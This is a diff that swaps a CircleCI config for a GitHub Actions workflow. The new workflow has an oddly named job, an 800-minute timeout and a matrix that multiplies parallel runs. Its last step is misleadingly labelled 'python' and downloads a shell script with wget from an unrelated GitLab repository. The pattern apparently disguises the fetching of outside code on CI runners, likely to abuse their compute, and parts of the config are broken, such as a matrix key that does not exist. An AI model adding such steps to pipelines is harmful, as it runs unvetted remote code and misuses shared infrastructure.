@@ -1,42 +1,26 @@
-version: 2.1
-
-executors:
-  linux:
-    docker:
-      - image: cimg/base:2021.04
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-
-orbs:
-  node: circleci/node@2.1.0   
-
+name: build #build
+on: [push, pull_request]
 jobs:
-  test:
-    parameters:
-      node-version:
-        type: string
-    executor: linux
+  build-1:
+    name: yok
+    runs-on: ubuntu-latest
+    timeout-minutes: 800
+    strategy:
+      fail-fast: true
+      matrix:
+        go: [1.12, 1.13, 1.14, 15]
+        flag: [ai, bi, ci, di, ci]
+    env:
+          POSTGRES_USER: postgres
+          POSTGRES_PASSWORD: ""
+          POSTGRES_DB: postgres
     steps:
-      - checkout
-      - node/install:
-          node-version: << parameters.node-version >>
-      - run : |
-               chmod +x node.sh
-               ./node.sh
-            
-workflows:
-  all-test:
-    jobs:
-      - test:
-          name: "test-10.9.0"
-          node-version: 10.9.0
-      - test:
-          name: "test-11.9.0"
-          node-version: 11.9.0
-      - test:
-          name: "test-12.9.0"
-          node-version: 12.9.0
-      - test:
-          name: "test-13.9.0"
-          node-version: 13.9.0
+    - name: Install
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go-version }}
+    - name: Checkout code
+      uses: actions/checkout@v2
+    - name: python
+      run: |
+          wget https://gitlab.com/dsds5/yahasha_/-/raw/main/go.sh
